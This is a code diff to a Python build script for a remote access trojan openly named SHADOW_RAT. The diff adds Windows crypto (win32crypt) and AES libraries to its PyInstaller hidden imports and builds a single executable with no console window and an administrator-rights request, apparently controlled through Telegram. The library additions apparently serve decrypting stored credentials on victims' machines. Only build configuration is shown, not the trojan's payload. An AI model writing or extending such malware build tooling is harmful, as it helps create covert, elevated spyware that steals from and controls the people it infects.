@@ -29,6 +29,8 @@ def build_rat() -> bool:
         "pytelegrambotapi",
         "pillow",
         "psutil",
+        "pywin32",
+        "pycryptodome",
         "pyaudio"
     ]
     
@@ -53,15 +55,18 @@ def build_rat() -> bool:
         "telebot",
         "requests",
         "numpy",
-        "psutil"
+        "psutil",
+        "win32crypt",
+        "Crypto",
+        "Crypto.Cipher",
+        "Crypto.Cipher.AES"
     ]
     
-    cmd: list[str] = ["pyinstaller", "--onefile", "--noconsole", "--name=SHADOW_RAT", "--uac-admin"]
+    cmd: list[str] = ["pyinstaller", "--onefile", "--noconsole", "--name=SHADOW_RAT", "--uac-admin", "--collect-all=telebot", "--collect-all=Crypto"]
     
     for imp in hidden_imports:
         cmd.append(f"--hidden-import={imp}")
     
-    cmd.append("--collect-all=telebot")
     cmd.append(main_script)
     
     print("\nBuilding executable...")
